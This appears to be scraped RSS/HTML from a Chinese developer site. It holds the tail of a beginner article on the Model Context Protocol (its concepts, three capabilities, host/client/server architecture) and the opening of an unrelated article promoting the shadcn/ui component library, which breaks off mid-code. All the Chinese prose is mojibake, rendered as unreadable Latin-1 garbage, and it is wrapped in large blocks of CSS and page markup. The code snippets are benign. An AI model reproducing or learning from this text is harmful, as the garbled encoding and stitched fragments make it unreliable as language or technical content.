li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>æˆ‘ä¸€ç›´ä¸ºç½‘ä¸Šæ²¡æœ‰å¾ˆå¥½ä¸”é€šä¿—æ˜“æ‡‚çš„MCPæŠ€æœ¯æ–‡æ¡£è€Œçƒ¦æ¼ï¼Œæ‰€ä»¥æˆ‘é€šè¿‡è®°å½•è‡ªå·±æŸ¥é˜…å®˜æ–¹æ–‡æ¡£æ¥å†™ä¸€ä»½é€šä¿—æ˜“æ‡‚çš„MCPæŠ€æœ¯æ–‡æ¡£ï¼Œä»æ¶æ„åˆ°å®æˆ˜ï¼Œæ—¢æœ‰æŠ€æœ¯æ·±åº¦ï¼Œåˆèƒ½è®©å°ç™½ä¸€å¬å°±æ‡‚ã€‚è¿™å¯¹æˆ‘æ˜¯ä¸€ç§æŒ‘æˆ˜ï¼Œå¦‚æœç¬”è¯¯å¯ä»¥åœ¨è¯„è®ºåŒºæŒ‡å‡ºï¼Œè°¢è°¢ï¼</p>
<h2 data-id="heading-1">MCPæ˜¯ä»€ä¹ˆ</h2>
<p>Model Context Protocol (MCP) æ˜¯ Anthropic äº 2024 å¹´ 11 æœˆå‘å¸ƒçš„<strong>å¼€æ”¾æ ‡å‡†åè®®</strong>,æ—¨åœ¨ä¸º LLM åº”ç”¨æä¾›ç»Ÿä¸€çš„æ–¹å¼æ¥è¿æ¥å¤–éƒ¨æ•°æ®æºå’Œå·¥å…·ã€‚å®ƒè¢«ç§°ä¸º"AI çš„ type-cæ¥å£"ã€‚</p>
<p>ä½†æ˜¯æˆ‘è§‰å¾—å¦‚æœå°±å°†å®ƒæ¯”å–»æˆtype-cæ¥å£ï¼Œæˆ‘è§‰å¾—å¤ªè‰ç‡ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ ‡å‡ºé‡ç‚¹ï¼Œ<strong>MCPå®ƒæ˜¯ä¸€ç§åè®®ï¼Œä¸€ç§æ ‡å‡†ï¼</strong> MCPæ˜¯ä¸€ç§åè®®ï¼ŒMCPæ˜¯ä¸€ç§åè®®ï¼ŒMCPæ˜¯ä¸€ç§åè®®ï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éã€‚</p>
<p>é‚£ä¹ˆå®ƒåˆ°åº•æ˜¯å¹²äº†ä»€ä¹ˆï¼Ÿè¿™é‡Œç›´æ¥é€šä¿—æ˜“æ‡‚æ¥è¯´å§ï¼Œ<strong>å‡å¦‚è¯´LLMæ˜¯å¤§è„‘ï¼Œé‚£ä¹ˆLLMå¯ä»¥é€šè¿‡MCPåè®®é•¿å‡ºæ‰‹è„š</strong>ï¼Œå¯ä»¥åšåˆ°è®¿é—®èµ„æºï¼Œè°ƒç”¨å·¥å…·ï¼Œé¢„åˆ¶æ¨¡æ¿çš„äº‹æƒ…ç­‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿåœ¨å¤æ—©æ—¶æœŸï¼Œä¹Ÿå°±æ˜¯Chat-GPTæ¨ªç©ºå‡ºä¸–çš„æ—¶å€™ï¼Œä»–ä¹Ÿå°±æ˜¯ä¸€ä¸ªç®€å•çš„chatbotï¼Œé ç€ä»¥å¾€çš„çŸ¥è¯†åº“å›ç­”é—®é¢˜ï¼Œè€Œä¸èƒ½å®æ—¶å»è®¿é—®webä¸Šçš„èµ„æºå’Œä½ è‡ªå·±çš„çŸ¥è¯†åº“ï¼Œä¹Ÿä¸èƒ½å»å¸®ä½ å‘é‚®ä»¶ï¼Œè®¢èˆªç­ç­‰ç­‰ã€‚æœ‰äº†MCPï¼Œæˆ‘ä»¬å°±æœ‰äº†ä¸€ç§æ ‡å‡†å»åšè¿™äº›äº‹ã€‚æˆ‘ä»¬åªè¦å»å®ç°äº†æ ‡å‡†MCPçš„æ¥å£ï¼Œæ•°æ®å‘é€å’Œæ¥æ”¶éƒ½æ˜¯è§£æç›¸åŒæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæŒ‰ç…§ç†è®ºæ¥è¯´ï¼Œæˆ‘ä»¬å°±èƒ½è®©AIåº”ç”¨å¸®æˆ‘ä»¬åšä»»ä½•äº‹æƒ…(å½“å‰ä¸è®¨è®ºç‰©ç†ä¸–ç•Œçš„åŠ³åŠ¨)ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de8c446fe4c4e9f8572ca5b9ca4a1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771150068&amp;x-signature=FS2HAhCeUY3J0dcLOin0YMVC5Z8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">MCPåˆ°åº•è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2>
<p>æˆ‘ä»¬ä¸Šé¢è®¨è®ºäº†MCPèƒ½å¸®æˆ‘ä»¬å®ç°çš„äº‹æƒ…ï¼Œé‚£ä¹ˆMCPå®ƒæœ¬è´¨ä¸Šåˆ°åº•è§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿéš¾é“æˆ‘ä»¬ä»¥å‰æ²¡æœ‰MCPå°±æ— æ³•æŸ¥çœ‹webä¸Šé¢çš„èµ„æºæˆ–è€…çŸ¥è¯†åº“å—ï¼Ÿè®©æˆ‘ä»¬ä¸‹é¢ä¸€èµ·è®¨è®ºä¸€ä¸‹ã€‚</p>
<p>ä¼ ç»Ÿä¸Šï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥å®ç°MCPçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿™æ ·æœ‰ä¸ªé—®é¢˜ï¼Œæ¯ä¸ªä¼ä¸šæ‰€åˆ›é€ å‡ºæ¥çš„è½¯ä»¶æˆ–è€…è¯´åº”ç”¨ç¨‹åºï¼Œå®ƒéƒ½ä¸æ˜¯ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥è¿›è¡Œtool callingçš„ï¼Œéƒ½æ˜¯<strong>è‡ªæˆä¸€æ´¾</strong>ã€‚è¿™æ ·å°±ä¼šå¯¼è‡´é›†æˆéå¸¸ç¹æ‚ã€‚</p>
<p>ä¸Šä»£ç æ¥è§£é‡Šä¸€ä¸‹è¿™ç§ç°è±¡ï¼Ÿ</p>
<p><strong>ä¼ ç»Ÿæ–¹å¼çš„ç—›ç‚¹:</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ¯ä¸ªé›†æˆéƒ½éœ€è¦è‡ªå®šä¹‰ä»£ç </span>
<span class="hljs-keyword">if</span> service == <span class="hljs-string">"github"</span>:
    github_client = GitHubClient(token)
    data = github_client.get_issues()
<span class="hljs-keyword">elif</span> service == <span class="hljs-string">"slack"</span>:
    slack_client = SlackClient(token)
    data = slack_client.get_messages()
<span class="hljs-keyword">elif</span> service == <span class="hljs-string">"database"</span>:
    db_client = DatabaseClient(connection_string)
    data = db_client.query(<span class="hljs-string">"SELECT * FROM users"</span>)
<span class="hljs-comment"># ... æ¯ä¸ªæœåŠ¡éƒ½ä¸åŒ</span>
</code></pre>
<p><strong>ä½¿ç”¨MCPç»Ÿä¸€äº†ä¹‹åï¼š</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç»Ÿä¸€æ¥å£,æ ‡å‡†åŒ–åè®®</span>
mcp_client = McpClient()

<span class="hljs-comment"># æ‰€æœ‰æœåŠ¡ä½¿ç”¨ç›¸åŒçš„åè®®</span>
resources = mcp_client.list_resources()  <span class="hljs-comment"># è·å–å¯ç”¨èµ„æº</span>
tools = mcp_client.list_tools()          <span class="hljs-comment"># è·å–å¯ç”¨å·¥å…·</span>
result = mcp_client.call_tool(<span class="hljs-string">"search"</span>, args)  <span class="hljs-comment"># è°ƒç”¨å·¥å…·</span>
</code></pre>
<p><strong>è¿™é‡Œæˆ‘ä»¬å¼ºè°ƒä¸€ä¸‹MCPçš„ä¸‰å¤§æ ¸å¿ƒèƒ½åŠ›å§</strong>ï¼Œåˆ†åˆ«æ˜¯<strong>è®¿é—®èµ„æºï¼Œè°ƒç”¨å·¥å…·ï¼Œé¢„åˆ¶æ¨¡æ¿</strong>ï¼Œä¸‹é¢çš„è¡¨æ ¼è§£é‡Šäº†å®ƒå„è‡ªçš„ç‰¹ç‚¹ä¸ä½œç”¨</p>





























<table><thead><tr><th>èƒ½åŠ›</th><th>è¯´æ˜</th><th>æ§åˆ¶æ–¹</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><strong>Resources</strong></td><td>åªè¯»æ•°æ®æº</td><td>Application</td><td>æ–‡ä»¶å†…å®¹ã€æ•°æ®åº“è®°å½•ã€API å“åº”</td></tr><tr><td><strong>Tools</strong></td><td>å¯æ‰§è¡Œå‡½æ•°</td><td>Model</td><td>æœç´¢èˆªç­ã€å‘é€æ¶ˆæ¯ã€åˆ›å»ºæ—¥å†äº‹ä»¶</td></tr><tr><td><strong>Prompts</strong></td><td>é¢„åˆ¶æ¨¡æ¿</td><td>User</td><td>è®¡åˆ’æ—…è¡Œã€æ€»ç»“ä¼šè®®ã€èµ·è‰é‚®ä»¶</td></tr></tbody></table>
<p>ç†è§£ä¸‰å¤§èƒ½åŠ›æ˜¯éå¸¸é‡è¦çš„ï¼Œå…³ä¹MCPçš„å¼€å‘èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-3">MCPçš„æ¶æ„</h2>
<p>ç°åœ¨æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹MCPçš„æ¶æ„æ˜¯æ€ä¹ˆæ ·çš„ã€‚</p>
<p>MCP é‡‡ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¶æ„ï¼Œå…¶ä¸­ MCP ä¸»æœºï¼ˆä¾‹å¦‚Claude Codeæˆ–Claude Desktopç­‰ AI åº”ç”¨ï¼‰ä¸ä¸€ä¸ªæˆ–å¤šä¸ª MCP æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚MCP ä¸»æœºé€šè¿‡ä¸ºæ¯ä¸ª MCP æœåŠ¡å™¨åˆ›å»ºä¸€ä¸ª MCP å®¢æˆ·ç«¯æ¥å®ç°è¿™ä¸€ç‚¹ã€‚æ¯ä¸ª MCP å®¢æˆ·ç«¯ä¸å…¶å¯¹åº”çš„ MCP æœåŠ¡å™¨ä¿æŒä¸“ç”¨è¿æ¥ã€‚ä½¿ç”¨ STDIO ä¼ è¾“çš„æœ¬åœ° MCP æœåŠ¡å™¨é€šå¸¸æœåŠ¡äºå•ä¸ª MCP å®¢æˆ·ç«¯ï¼Œè€Œä½¿ç”¨ Streamable HTTP ä¼ è¾“çš„è¿œç¨‹ MCP æœåŠ¡å™¨é€šå¸¸æœåŠ¡äºå¤šä¸ª MCP å®¢æˆ·ç«¯ã€‚MCPæ¶æ„çš„å…³é”®å‚ä¸è€…åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>MCP ä¸»æœº</strong>ï¼šç”¨äºåè°ƒå’Œç®¡ç†ä¸€ä¸ªæˆ–å¤šä¸ª MCP å®¢æˆ·ç«¯çš„ AI åº”ç”¨ç¨‹åº</li>
<li><strong>MCP å®¢æˆ·ç«¯</strong>ï¼šä¸€ä¸ªç»´æŠ¤ä¸ MCP æœåŠ¡å™¨è¿æ¥å¹¶ä» MCP æœåŠ¡å™¨è·å–ä¸Šä¸‹æ–‡ä»¥ä¾› MCP ä¸»æœºä½¿ç”¨çš„ç»„ä»¶ã€‚</li>
<li><strong>MCP æœåŠ¡å™¨</strong>ï¼šä¸€ä¸ªä¸º MCP å®¢æˆ·ç«¯æä¾›ä¸Šä¸‹æ–‡ä¿¡æ¯çš„ç¨‹åº</li>
</ul>
<p>è¿™é‡Œå¼•ç”¨å®˜æ–¹æ–‡æ¡£çš„ä¾‹å­ï¼š</p>
<p><strong>ä¾‹å¦‚</strong>ï¼šVisual Studio Code å……å½“ MCP ä¸»æœºã€‚å½“ Visual Studio Code ä¸ MCP æœåŠ¡å™¨ï¼ˆä¾‹å¦‚Sentry MCP æœåŠ¡å™¨ï¼‰å»ºç«‹è¿æ¥æ—¶ï¼ŒVisual Studio Code è¿è¡Œæ—¶ä¼šå®ä¾‹åŒ–ä¸€ä¸ª MCP å®¢æˆ·ç«¯å¯¹è±¡æ¥ç»´æŠ¤ä¸ Sentry MCP æœåŠ¡å™¨çš„è¿æ¥ã€‚éšåï¼Œå½“ Visual Studio Code è¿æ¥åˆ°å¦ä¸€ä¸ª MCP æœåŠ¡å™¨ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶ç³»ç»ŸæœåŠ¡å™¨ï¼‰æ—¶ï¼ŒVisual Studio Code è¿è¡Œæ—¶ä¼šå®ä¾‹åŒ–å¦ä¸€ä¸ª MCP å®¢æˆ·ç«¯å¯¹è±¡æ¥ç»´æŠ¤æ­¤è¿æ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1175bce98b984503942606e4f14729ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771150068&amp;x-signature=TzpnLzD1wWltwmNdRfZ0IFUK5J0%3D" alt="image.png" loading="lazy"/></p>
<p>è¯·æ³¨æ„ï¼Œ<strong>MCP æœåŠ¡å™¨</strong>æŒ‡çš„æ˜¯æä¾›ä¸Šä¸‹æ–‡æ•°æ®çš„ç¨‹åºï¼Œæ— è®ºå…¶è¿è¡Œä½ç½®å¦‚ä½•ã€‚MCP æœåŠ¡å™¨å¯ä»¥æœ¬åœ°è¿è¡Œï¼Œä¹Ÿå¯ä»¥è¿œç¨‹è¿è¡Œã€‚ä¾‹å¦‚ï¼Œå½“ Claude Desktop å¯åŠ¨æ–‡ä»¶ç³»ç»ŸæœåŠ¡å™¨æ—¶ï¼Œç”±äºå®ƒä½¿ç”¨ STDIO ä¼ è¾“ï¼Œå› æ­¤æœåŠ¡å™¨è¿è¡Œåœ¨åŒä¸€å°æœºå™¨ä¸Šã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºâ€œæœ¬åœ°â€MCP æœåŠ¡å™¨ã€‚å®˜æ–¹çš„Â Sentry MCP æœåŠ¡å™¨è¿è¡Œåœ¨ Sentry å¹³å°ä¸Šï¼Œå¹¶ä½¿ç”¨ Streamable HTTP ä¼ è¾“ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºâ€œè¿œç¨‹â€MCP æœåŠ¡å™¨ã€‚</p>
<h2 data-id="heading-4">å°ç»“</h2>
<p>ç¬¬ä¸€ç¯‡æˆ‘ä»¬å°±å…ˆè§£æMCPçš„æ¦‚å¿µï¼Œè§£å†³çš„é—®é¢˜ï¼Œè¿˜æœ‰æ¶æ„ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­è§£æé€šä¿¡åè®®å’Œæ•°æ®æ ¼å¼ç­‰ï¼Œæœ‰å…´è¶£çš„å¯ä»¥å…³æ³¨æ­¤æ ç›®</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[shadcn/uiï¼Œç»™ä½ ä¸€ä¸ªçœŸæ­£å¯æ§çš„UIç»„ä»¶åº“]]></title>    <link>https://juejin.cn/post/7604093823959285779</link>    <guid>https://juejin.cn/post/7604093823959285779</guid>    <pubDate>2026-02-09T07:49:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604093823959285779" data-draft-id="7604433863725203510" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="shadcn/uiï¼Œç»™ä½ ä¸€ä¸ªçœŸæ­£å¯æ§çš„UIç»„ä»¶åº“"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:49:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜_June"/> <meta itemprop="url" content="https://juejin.cn/user/395479916219517"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            shadcn/uiï¼Œç»™ä½ ä¸€ä¸ªçœŸæ­£å¯æ§çš„UIç»„ä»¶åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479916219517/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜_June
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:49:45.000Z" title="Mon Feb 09 2026 07:49:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å½“â€œä»£ç æ‰€æœ‰æƒâ€æˆä¸ºä¸€ç§å¥¢ä¾ˆï¼Œshadcn/ui å´æŠŠæ¯ä¸€è¡Œç»„ä»¶æºç éƒ½äº¤åˆ°ä½ æ‰‹ä¸­ã€‚</p>
</blockquote>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šè®¾è®¡å¸ˆæ‹¿ç€ç•Œé¢ç¨¿è¯´ï¼šâ€œè¿™ä¸ªæŒ‰é’®ï¼Œåœ†è§’å†å¤§ç‚¹ï¼Œé˜´å½±å†æŸ”å’Œç‚¹ã€‚â€ä½ ç‚¹å¤´ç­”åº”ï¼Œå›å¤´é¢å¯¹ä»£ç ï¼Œå´è¦ç¿»æ–‡æ¡£ã€æŸ¥æ–¹æ¡ˆã€å°å¿ƒç¿¼ç¿¼åœ°å†™è¦†ç›–æ ·å¼ï¼Œåªä¸ºæ”¹ä¸€ä¸ªæŒ‰é’®çš„å¤–è§‚ã€‚</p>
<p>ç›´åˆ° <strong>shadcn/ui</strong> å‡ºç°ï¼Œè¿™ä¸€åˆ‡å˜äº†ã€‚è¿™ä¸ªä¸ç”¨ <code>npm install</code>ï¼Œå´è®©æ— æ•° React å¼€å‘è€…ç€è¿·çš„é¡¹ç›®ï¼Œæ­£åœ¨ç”¨å…¨æ–°çš„æ–¹å¼å®šä¹‰æˆ‘ä»¬å†™ç•Œé¢çš„ä½“éªŒã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ç‹¬ç‰¹å“²å­¦ï¼šæŠŠæºç äº¤ç»™ä½ ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªâ€œé»‘ç®±â€</h2>
<p><strong>ä¼ ç»ŸUIåº“</strong>ï¼ˆå¦‚Ant Designã€MUIï¼‰çš„è¿ä½œæ–¹å¼åƒä¸€ä¸ªâ€œé»‘ç®±â€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ å®‰è£…çš„æ˜¯ä¸€ä¸ªå‹ç¼©çš„åŒ…</span>
npm install @mui/material

<span class="hljs-comment">// ä½¿ç”¨å®ƒï¼Œä½†æ— æ³•è½»æ˜“ä¿®æ”¹å®ƒ</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@mui/material'</span>;
</code></pre>
<p><strong>shadcn/ui</strong> åˆ™é‡‡ç”¨äº†ä¸€ç§é©å‘½æ€§çš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸æ˜¯å®‰è£…åŒ…ï¼Œè€Œæ˜¯å¤åˆ¶æºç </span>
npx shadcn-ui@latest add button

<span class="hljs-comment"># ç»“æœï¼šå®Œæ•´çš„button.tsxæ–‡ä»¶å‡ºç°åœ¨ä½ çš„é¡¹ç›®ä¸­</span>
<span class="hljs-comment"># src/components/ui/button.tsx</span>
</code></pre>
<p><strong>è¿™ç§å·®å¼‚æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</strong> å½“ç»„ä»¶ä»£ç å°±åœ¨ä½ çš„<code>components/ui</code>ç›®å½•ä¸‹æ—¶ï¼Œä½ å¯ä»¥ï¼š</p>
<ul>
<li><strong>ç›´æ¥ä¿®æ”¹ä»»ä½•æ ·å¼ç»†èŠ‚</strong></li>
<li><strong>è°ƒæ•´ç»„ä»¶çš„å†…éƒ¨é€»è¾‘</strong></li>
<li><strong>æŸ¥çœ‹å®Œæ•´çš„å®ç°ï¼Œæ²¡æœ‰éšè—çš„â€œé­”æ³•â€</strong></li>
<li><strong>æ‹¥æœ‰100%çš„ä»£ç æ‰€æœ‰æƒ</strong></li>
</ul>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒä¼˜åŠ¿ï¼šä¸ºä»€ä¹ˆå¼€å‘è€…çˆ±ä¸é‡Šæ‰‹ï¼Ÿ</h2>
<h3 data-id="heading-2">1. æè‡´çš„å®šåˆ¶è‡ªç”±</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šäº§å“ç»ç†è¦æ±‚æŠŠæŒ‰é’®çš„æ‚¬åœæ•ˆæœæ”¹æˆæ¸å˜è‰²ã€‚ä¼ ç»Ÿæ–¹å¼å¯èƒ½éœ€è¦æŸ¥æ‰¾ä¸»é¢˜è¦†ç›–æ–‡æ¡£ã€ç¼–å†™è‡ªå®šä¹‰CSSã€æ‹…å¿ƒæ ·å¼å†²çªã€‚è€Œ<strong>ä½¿ç”¨shadcn/uiï¼Œä½ åªéœ€è¦ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç›´æ¥æ‰“å¼€ button.tsx ä¿®æ”¹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Button</span> = <span class="hljs-title class_">React</span>.<span class="hljs-property">forwardRef</span>&lt;<span class="hljs-title class_">HTMLButtonElement</span>, <span class="hljs-title class_">ButtonProps</span>&gt;(
  <span class="hljs-function">(<span class="hljs-params">{ className, variant = <span class="hljs-string">"default"</span>, size = <span class="hljs-string">"default"</span>, ...props }, ref</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">{cn(</span>
